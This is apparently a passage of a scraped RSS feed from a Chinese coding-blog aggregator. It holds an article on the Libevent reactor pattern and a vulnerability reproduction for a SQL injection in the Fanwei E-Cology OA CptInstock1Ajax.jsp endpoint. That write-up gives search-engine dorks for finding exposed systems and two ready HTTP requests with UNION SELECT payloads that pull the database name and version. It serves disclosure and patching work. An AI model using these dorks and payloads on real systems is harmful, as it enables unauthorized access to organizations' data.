upstream cluster1{server 10.0.0.4:80  weight1 max_fails3 fail_timeout30s;server 10.0.0.5:80  weight1 max_fsils3 fsil_tomeout;check interval3000 rise2 fall5 timeout1000 typehttp;check interval3000 rise2 fall5 timeout1000…阅读更多...CTF学习——攻防世界查看网页源代码的方法 
第一种&amp;#xff1a;F12 
第二种&amp;#xff1a;鼠标右键→查看网页源代码 
第三种&amp;#xff1a;ctrlshiftI 
第四种&amp;#xff1a;ctrlU 
第五种&amp;#xff1a;在url前面加view-source: 
第六种&amp;#xff1a;将网页另存为.html文件&amp;#xff0c;然后用文本编辑器打…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:36 +0000</pubDate>
    </item>
    <item>
      <title>Libevent源码剖析之reactor</title>
      <link>https://www.ppmy.cn/news/1540334.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Libevent源码剖析之reactornews/2025/10/31 17:52:34/1 简介reactor是一种事件驱动的并发处理模式，常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作，避免阻塞，并且能够高效处理大量并发的事件。one loop per thread or process，以下摘自 reactor 原文：Thereactorsoftware design pattern is an event handling strategy that can respond to many potential service requests concurrently. The pattern's key component is an event loop, running in asinglethread or process, which demultiplexes incoming requests and dispatches them to the correct request handler.[1]By relying on event-based mechanisms rather than blocking I/O or multi-threading, a reactor can handle many concurrent I/O bound requests with minimal delay.[2] A reactor also allows for easily modifying or expanding specific request handler routines, though the pattern does have some drawbacks and limitations.[1]With its balance of simplicity and scalability, the reactor has become a central architectural element in several server applications and software frameworks for networking. Derivations such as themultireactorand proactor also exist for special cases where even greater throughput, performance, or request complexity are necessary.[1][2][3][4]在此列出多路复用相关文章：Libevent源码剖析之iocp-CSDN博客Libevent源码剖析之reactor-CSDN博客Libevent源码剖析之epoll-CSDN博客Libevent源码剖析之poll-CSDN博客Libevent源码剖析之select-CSDN博客1.1 工作组件事件源：系统中会有多个事件源，例如网络套接字、文件描述符、定时器等，触发各种事件，如读、写、超时等。事件分离器 (Demultiplexer)：事件分离器（通常是系统调用，如select(), poll(), 或epoll()）负责监控这些事件源，并将发生事件的事件源标记出来。事件分派器 (Dispatcher)：Reactor设计中的核心部分，事件分派器接收到事件分离器传来的事件后，将其分发给相应的处理器（Event Handler）处理。每个事件对应一个预定义的事件处理函数。事件处理器 (Event Handler)：事件处理器包含事件处理的逻辑。当事件分派器传递某个事件时，事件处理器负责处理该事件，例如处理网络连接请求，或者读取某个套接字中的数据。1.2 工作流程等待事件发生：reactor首先通过系统调用（如select()或epoll()）等待某些I/O事件发生。事件分离：当某个I/O事件发生时，事件分离器（select()或epoll()）返回一组已经就绪的事件。事件处理：事件分派器检查哪些事件已经准备好，并将这些事件交由对应的事件处理器进行处理。继续监听：事件处理结束后，reactor重新回到等待事件的状态，重复此过程。1.3 单线程 vs 多线程单线程 reactor：适合处理简单的并发情况，整个流程都是在一个线程中进行，因此不需要考虑线程同步问题。然而，当处理时间较长的操作时，可能会阻塞其他事件的处理，开源软件比如redis缓存数据库。多线程 reactor：将I/O事件和实际事件处理分开。reactor在单线程中监听和分派事件，而将事件处理分配给工作线程（Thread Pool）。这样可以避免阻塞，提高并发处理能力，开源软件如memcached缓存数据库。1.4 reactor 和 proactorreactor是同步非阻塞模型，事件循环等待事件发生，当某个事件准备好后，交给处理器进行处理。proactor则是异步模型，事件发生时由内核完成操作（如I/O操作），然后通知应用程序进行进一步处理。2 原理2.1 组件图reactor相关组件图如下：​2.2 序列图各组件工作序列图：​3 reactor3.1 classic service design​解释说明：此为同步阻塞模式；逐个处理client请求，当1个client连接成功后，read=&gt;decode=&gt;compute=&gt;encode=&gt;send，如此流程处理完毕，方可处理下一个client请求；以client为并发粒度，粒度大，并发响应延迟高，不适合高并发场景，适用于mysql这种应用场景；handler可以是一个线程或进程；3.2 single reactor per thread解释说明：1个线程1个reactor，1个acceptor，所有client的IO事件收集&amp;分发&amp;处理，均在此线程处理；此线程持有1个acceptor，专门用来并发处理client的connect请求；所有的IO操作和计算任务，均在此reactor线程处理；并发粒度为event，而非client，并发粒度低，并且能很好的解决数据乱序问题，但不能发挥多CPU核心优势，适用于redis这种内存数据库；若设计为multiple single reactor per thread，如此便可解决此模式的缺陷，既能发挥多CPU核心优势，又能适用于IO密集型，非常灵活，但若是多进程下需解决accept惊群问题，如nginx；3.3 single reactor + work thread poll​解释说明：此模式在single reactor per thread基础之上，将IO操作和event业务逻辑处理分离开来，由reactor线程充当acceptor和所有IO操作职责，所有计算任务由thread poll来处理；当1个client请求过来，reactor的acceptor accept客户端的connect请求，然后read数据完毕，将fd和业务逻辑处理handler封装起来，投递到queued tasks中，从thread poll中分配1个线程来处理，待处理完毕，再回到reactor线程发送给client，如此循环；reactor线程和thread poll通过队列来通信，前者处理IO操作，后者处理业务逻辑；缺点：acceptor和所有IO操作，均由reactor线程处理，瓶颈在此；优点：将IO操作交由reactor线程，业务逻辑交由thread poll，可充分发挥多CPU核心优势，也可很好的解决数据乱序问题，适用于高并发场景；可通过设计为multiplesingle reactor + work thread poll来解决以上问题；3.4 multiple reactor + thread poll解释说明：与single reactor + work thread poll不同之处在于，此模式将reactor线程根据职责，一分为二，分离出mainReactor线程和subReactor线程，前者专门负责并发处理client的connect请求，后者则负责处理所有IO操作；其他均与single reactor + work thread poll模式一致，不再赘述；4 参考文献4.1 reactor wikihttps://en.wikipedia.org/wiki/Reactor_pattern#Structure4.2 reactor pattern​​​​​​Scalable IO in Javahttp://www.ppmy.cn/news/1540334.html相关文章泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...网页前端开发之HTML入门篇：链接标签 a链接标签 a 
&lt;a&gt;是HTML的链接标签&amp;#xff0c;其标签内容的是链接的标题&amp;#xff0c; 它是通过属性来设置链接的地址(URL)。 
属性说明 
href&amp;#xff1a;其值是链接的地址(URL)&amp;#xff1b;target&amp;#xff1a;其值是指定该如何打开链接&amp;#xff1b; 选项值_self&amp;#xf…阅读更多...nginx的负载均衡配置和重定向upstream_check模块  配置文件详情    
upstream cluster1{server 10.0.0.4:80  weight1 max_fails3 fail_timeout30s;server 10.0.0.5:80  weight1 max_fsils3 fsil_tomeout;check interval3000 rise2 fall5 timeout1000 typehttp;check interval3000 rise2 fall5 timeout1000…阅读更多...CTF学习——攻防世界查看网页源代码的方法 
第一种&amp;#xff1a;F12 
第二种&amp;#xff1a;鼠标右键→查看网页源代码 
第三种&amp;#xff1a;ctrlshiftI 
第四种&amp;#xff1a;ctrlU 
第五种&amp;#xff1a;在url前面加view-source: 
第六种&amp;#xff1a;将网页另存为.html文件&amp;#xff0c;然后用文本编辑器打…阅读更多...MySQL查看当前客户端连接数的方法每当有客户端连接到 MySQL 时&amp;#xff0c;MySQL 会为该连接创建一个新的线程来处理所有与该连接相关的查询和操作。所以通过查看MySQL当前的连接线程数量就可以知道有多少客户端连接到MySQL。 
方法一 
Threads_connected 仅显示活跃的客户端连接数 
SHOW STATUS LIKE Threads_…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:35 +0000</pubDate>
    </item>
    <item>
      <title>泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现</title>
      <link>https://www.ppmy.cn/news/1540333.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现news/2025/10/31 17:52:33/0x01 产品描述：‌泛微E-Cology是一款专为中大型组织设计的数字化办公系统，旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点，通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用，实现了组织的全面数字化转型‌0x02 漏洞描述：泛微 E-Cology OA协同商务系统前台CptInstock1Ajax接口存在SQL注入漏洞，攻击者可以通过漏洞获取服务器内敏感信息导致信息泄露，甚至通过漏洞写入木马病毒获取服务器权限。0x03 搜索语句：Fofa：app="泛微-OA（e-cology）"Hunter：body="/wui/common/page/sysRemind.jsp"Quake：body="/wui/common/page/sysRemind.jsp"0x04 漏洞复现：数据库查询：GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+DB_Name(),1# HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close版本查询：GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1# HTTP/1.1
Host:your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close0x05 修复建议：厂商已发布补丁 请及时修复。http://www.ppmy.cn/news/1540333.html相关文章STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...网页前端开发之HTML入门篇：链接标签 a链接标签 a 
&lt;a&gt;是HTML的链接标签&amp;#xff0c;其标签内容的是链接的标题&amp;#xff0c; 它是通过属性来设置链接的地址(URL)。 
属性说明 
href&amp;#xff1a;其值是链接的地址(URL)&amp;#xff1b;target&amp;#xff1a;其值是指定该如何打开链接&amp;#xff1b; 选项值_self&amp;#xf…阅读更多...nginx的负载均衡配置和重定向upstream_check模块  配置文件详情    
upstream cluster1{server 10.0.0.4:80  weight1 max_fails3 fail_timeout30s;server 10.0.0.5:80  weight1 max_fsils3 fsil_tomeout;check interval3000 rise2 fall5 timeout1000 typehttp;check interval3000 rise2 fall5 timeout1000…阅读更多...CTF学习——攻防世界查看网页源代码的方法 
第一种&amp;#xff1a;F12 
第二种&amp;#xff1a;鼠标右键→查看网页源代码 
第三种&amp;#xff1a;ctrlshiftI 
第四种&amp;#xff1a;ctrlU 
第五种&amp;#xff1a;在url前面加view-source: 
第六种&amp;#xff1a;将网页另存为.html文件&amp;#xff0c;然后用文本编辑器打…阅读更多...MySQL查看当前客户端连接数的方法每当有客户端连接到 MySQL 时&amp;#xff0c;MySQL 会为该连接创建一个新的线程来处理所有与该连接相关的查询和操作。所以通过查看MySQL当前的连接线程数量就可以知道有多少客户端连接到MySQL。 
方法一 
Threads_connected 仅显示活跃的客户端连接数 
SHOW STATUS LIKE Threads_…阅读更多...mysql 慢查询记录mysql&gt; SHOW VARIABLES LIKE ‘slow_query%’; mysql&gt; SHOW VARIABLES LIKE ‘long_query_time’; 
slow_query_log&amp;#xff1a;慢查询开启状态 slow_query_log_file&amp;#xff1a;慢查询日志存放的位置&amp;#xff08;一般设置为 MySQL 的数据存放目录&amp;#xff09; long_quer…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:34 +0000</pubDate>
    </item>
  </channel>
</rss>
